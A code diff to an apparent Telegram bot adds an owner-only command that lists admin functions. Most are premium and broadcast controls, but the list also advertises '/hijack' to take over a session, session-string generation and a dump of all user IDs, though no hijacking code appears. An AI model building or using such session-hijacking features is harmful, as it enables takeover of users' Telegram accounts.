@@ -144,4 +144,33 @@ async def smart_handler(client, message):
             [[InlineKeyboardButton("Verify the token now...", url=shortened_url)]]
         )
         await message.reply("Click the button below to verify your free access token: \n\n> What will you get ? \n1. No time bound upto 3 hours \n2. Batch command limit will be FreeLimit + 20 \n3. All functions unlocked", reply_markup=button)
- 
+
+# ✅ Function to show Admin Commands List
+@app.on_message(filters.command("admin_commands_list"))
+async def show_admin_commands(client, message):
+    """Displays the list of available admin commands (Owner only)."""
+    owner_id=1970647198
+    if message.from_user.id != owner_id:
+        await message.reply("🚫 You are not the owner and cannot access this command!")
+        return
+    
+    admin_commands = """
+    👤Owner Commands List:-
+    
+/add userID            - ➕ Add user to premium  
+/rem userID            - ➖ Remove user from premium  
+/stats                 - 📊 Get bot stats  
+/gcast                 - ⚡ Broadcast to all users  
+/acast                 - ⚡ Broadcast with name tag  
+/freez                 - 🧊 Remove expired users  
+/get                   - 🗄️ Get all user IDs  
+/lock                  - 🔒 Protect channel  
+/hijack                - ☠️ Hijack a session  
+/session               - 🪪 Generate session string  
+/connect_user          - 🔗 Connect owner & user  
+/disconnect_user       - ⛔ Disconnect a user  
+/admin_commands_list   - 📄 Show admin commands
+    """
+    await message.reply(admin_commands)
+
+#onwer bot command list till here
